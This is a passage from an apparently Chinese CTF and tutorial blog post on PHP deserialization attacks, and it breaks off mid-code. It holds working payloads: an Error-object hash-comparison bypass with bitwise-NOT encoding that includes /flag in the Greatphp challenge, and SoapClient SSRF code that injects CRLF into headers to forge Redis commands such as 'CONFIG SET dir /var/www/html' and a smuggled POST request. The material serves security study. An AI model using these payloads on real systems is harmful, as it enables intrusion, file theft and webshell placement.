<h5 id="exception-类"><a class="markdownIt-Anchor" href="#exception-类"></a> Exception 类</h5>
<p>条件：php5</p>
<p>类摘要</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 属性 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类属性：</strong></p>
<ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
</ul>
<p>在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>看看触发Error的__toString方法</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">输出</span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>下一个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的</p>
<p>利用Error和Exception类的这一点可以绕过在PHP类中的哈希比较</p>
<h5 id="2020-极客大挑战greatphp"><a class="markdownIt-Anchor" href="#2020-极客大挑战greatphp"></a> [2020 极客大挑战]Greatphp</h5>
<p>还是一样的，给出源码，就代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br></pre></td></tr></table></figure>
<p>对于这个，我们常见的是利用数组绕过强类型，但是这个是在类中，不能使用数组，只有使用Error类。</p>
<p>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法，刚才实验过，Error类中的<code>__toString</code>将类转换的字符串相等。</p>
<p>又存在preg_match，过滤了括号，无法调用函数，尝试<code>include &quot;/flag&quot;</code>,但是引号过滤了，我们可以使用<code>两次取反，自动获得字符串</code>的。(绕过引号，长知识了)</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">		   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$cmd</span>)</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">也可以用，也需要用两次取反</span></span><br><span class="line"><span class="comment">$str1 = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!&quot;.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;</span></span><br><span class="line"><span class="comment">$str = &quot;?&gt;&lt;?=include $_GET[1]?&gt;&quot;; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题我想到能不能同用hex编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>虽然最后也是String字符，但是我实验下没有成功。</p>
<p>我也想到一个payload,然后1来传参，但是也没成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str=&quot;?&gt;&quot;&lt;?=include$_GET[1];?&gt;&quot;</span><br></pre></td></tr></table></figure>
<h4 id="soapclient类来进行ssrf"><a class="markdownIt-Anchor" href="#soapclient类来进行ssrf"></a> SoapClient类来进行SSRF</h4>
<h5 id="soapclient类"><a class="markdownIt-Anchor" href="#soapclient类"></a> SoapClient类</h5>
<p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SoapClient &#123; </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而<code>__call</code>触发很简单，就是当对象访问不存在的方法的时候就会触发。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br><span class="line">- 第一个参数是用来指明是否是wsdl模式，将该值设为<span class="literal">null</span>则表示非wsdl模式。</span><br><span class="line">- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间</span><br></pre></td></tr></table></figure>
<p>直接利用SoapClient来进行SSRF</p>
<p>构造php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>记得监听自己VPN上的端口<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16-16672739578745.png" alt="请添加图片描述"></p>
<p>但是当存在CRLF漏洞，我们就可以通过<code>user_agent</code>的参数伪造http头</p>
<p>运行后，监听界面就出现了伪造的http头</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/f470fdddc476471d85f438538e078165-16672739578746.png" alt="请添加图片描述"><br>
这儿可以看看怎么利用伪造http头去构造redis命令</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/0bd047f6a1934f67ba766f9caead2a7e-16672739578747.png" alt="在这里插入图片描述"><br>
伪造了redis命令，这样我们就可以用http协议去打redis了。</p>
<p>对于发送POST数据包，Content-Type 的值我们要设置为 application/x-www-form-urlencoded，而且Content-Length的值需要与post的数据长度一致。而且http头跟post数据中间间隔<code>\r\n\r\n</code>,其他间隔<code>\r\n</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span 